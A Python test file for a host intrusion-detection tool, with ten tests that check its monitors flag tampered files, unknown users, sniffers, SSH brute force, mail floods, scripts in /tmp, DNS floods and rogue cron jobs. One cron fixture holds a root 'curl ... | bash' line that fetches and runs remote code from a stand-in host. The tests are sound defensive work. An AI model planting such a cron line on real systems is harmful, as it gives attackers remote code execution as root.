from detection.access_monitor import analyze_access_lines
from detection.cron_monitor import run_check as run_cron_check
from detection.ddos_detect import run_check as run_ddos_check
from detection.file_integrity import calculate_sha256
from detection.file_integrity import run_check as run_file_integrity_check
from detection.log_analyzer import analyze_lines
from detection.mail_queue import run_check as run_mail_queue_check
from detection.process_monitor import run_check as run_process_check
from detection.sniffer_detect import run_check as run_sniffer_check
from detection.tmp_monitor import run_check as run_tmp_check
from detection.users_monitor import run_check as run_users_check


def assert_alarm(alarms, alarm_type, module):
    assert alarms
    assert alarms[0]["tipo_alarma"] == alarm_type
    assert alarms[0]["modulo"] == module


def test_module_01_file_integrity_detects_modified_file(tmp_path):
    critical_file = tmp_path / "passwd_test"
    critical_file.write_text("contenido original\n")
    baseline = {str(critical_file): calculate_sha256(str(critical_file))}
    critical_file.write_text("contenido modificado\n")

    alarms = run_file_integrity_check(
        baseline=baseline,
        files=[str(critical_file)],
    )

    assert_alarm(alarms, "MODIFICACION_ARCHIVO", "file_integrity")


def test_module_02_users_monitor_detects_unexpected_user(monkeypatch):
    monkeypatch.setattr(
        "detection.users_monitor.list_logged_users",
        lambda: "intruso pts/0 2026-06-24 10:00 (10.0.0.9)\n",
    )

    alarms = run_users_check(
        allowed_users={"lucasfadul"},
        user_shells={"intruso": "/bin/bash"},
    )

    assert_alarm(alarms, "USUARIO_SOSPECHOSO", "users_monitor")


def test_module_03_sniffer_detect_finds_tcpdump(monkeypatch):
    def fake_command_output(command):
        if command == ["ip", "link"]:
            return "2: enp0s1: <BROADCAST,MULTICAST,UP> mtu 1500\n"
        if command == ["ps", "aux"]:
            return (
                "USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\n"
                "tcpdump 3327 0.0 0.3 15712 8296 pts/1 S 20:07 0:00 "
                "tcpdump -i enp0s1\n"
            )
        return ""

    monkeypatch.setattr(
        "detection.sniffer_detect.command_output",
        fake_command_output,
    )

    alarms = run_sniffer_check(authorized=False)

    assert_alarm(alarms, "SNIFFER_DETECTADO", "sniffer_detect")
    assert alarms[0]["pid"] == 3327


def test_module_04_log_analyzer_detects_failed_logins():
    lines = [
        f"Jun 24 host sshd[123]: Failed password for admin from 10.0.0.25 "
        f"port {2200 + index} ssh2"
        for index in range(6)
    ]

    alarms = analyze_lines(lines, failed_login_limit=5)

    assert_alarm(alarms, "FAILED_LOGIN_MULTIPLE", "log_analyzer")
    assert alarms[0]["ip_origen"] == "10.0.0.25"


def test_module_05_mail_queue_detects_excess_messages(monkeypatch):
    monkeypatch.setattr(
        "detection.mail_queue.get_mailq_output",
        lambda: "mensaje-1\nmensaje-2\nmensaje-3\n",
    )

    alarms = run_mail_queue_check(limit=2)

    assert_alarm(alarms, "MAIL_QUEUE_ALTA", "mail_queue")
    assert alarms[0]["conteo"] == 3


def test_module_06_process_monitor_detects_high_cpu(monkeypatch):
    monkeypatch.setattr(
        "detection.process_monitor.get_process_table",
        lambda: "PID USER %CPU %MEM COMMAND\n123 intruso 95.0 1.0 stress\n",
    )

    alarms = run_process_check(
        cpu_limit=90.0,
        memory_limit=90.0,
        process_whitelist=set(),
    )

    assert_alarm(alarms, "PROCESO_ALTO_CONSUMO", "process_monitor")
    assert alarms[0]["pid"] == 123


def test_module_07_tmp_monitor_detects_script(tmp_path):
    suspicious_file = tmp_path / "suspicious.sh"
    suspicious_file.write_text("#!/usr/bin/env bash\necho prueba\n")

    alarms = run_tmp_check(tmp_dir=str(tmp_path))

    assert_alarm(alarms, "ARCHIVO_TMP_SOSPECHOSO", "tmp_monitor")
    assert alarms[0]["archivo"] == str(suspicious_file)


def test_module_08_ddos_detect_finds_repeated_ip(tmp_path):
    dns_log = tmp_path / "dns.log"
    dns_log.write_text("".join("query from 10.10.10.10\n" for _ in range(4)))

    alarms = run_ddos_check(log_path=str(dns_log), request_limit=3)

    assert_alarm(alarms, "DDOS_DETECTADO", "ddos_detect")
    assert alarms[0]["ip_origen"] == "10.10.10.10"


def test_module_09_cron_monitor_detects_suspicious_command(tmp_path):
    cron_file = tmp_path / "cron_test"
    cron_file.write_text("* * * * * root curl http://example.invalid | bash\n")

    alarms = run_cron_check(paths=[str(cron_file)])

    assert_alarm(alarms, "CRON_SOSPECHOSO", "cron_monitor")
    assert alarms[0]["archivo"] == str(cron_file)


def test_module_10_access_monitor_detects_repeated_failures():
    lines = [
        f"Jun 24 host sshd[123]: Failed password for admin from 192.0.2.50 "
        f"port {2200 + index} ssh2"
        for index in range(6)
    ]

    alarms = analyze_access_lines(lines, failed_limit=5)

    assert_alarm(alarms, "ACCESO_INVALIDO_REPETIDO", "access_monitor")
    assert alarms[0]["ip_origen"] == "192.0.2.50"
